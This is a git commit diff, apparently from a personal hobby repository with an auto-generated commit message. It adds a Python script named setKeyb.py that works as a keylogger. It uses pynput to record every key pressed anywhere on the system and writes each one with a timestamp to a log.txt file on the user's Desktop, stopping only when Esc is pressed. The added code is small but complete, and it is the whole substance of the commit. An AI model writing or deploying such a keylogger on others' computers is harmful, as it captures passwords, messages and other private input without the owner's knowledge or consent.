30cdd15a4044d464fe97dd417bb54deb409724f5
Elias <orekiyuta@gmail.com>
2021-02-05 23:32:34 +0800

    2021-02-05/23:32:33.77 by auto commit

--- python/Pure/setKeyb.py
+++ python/Pure/setKeyb.py
@@ -20,6 +20,27 @@ import win32gui
 # app = win32gui.GetWindowText(hwnd)
 # print(app)
 
+from pynput.keyboard import Listener, Key
 
-# test git pus     
-# tttcccccssssOOCCC
+import os
+import logging
+
+username = os.getlogin()
+
+directory = f"C:/Users/{username}/Desktop"
+
+logging.basicConfig(filename=f"{directory}/log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+
+def on_press(key):
+    logging.info(key)
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
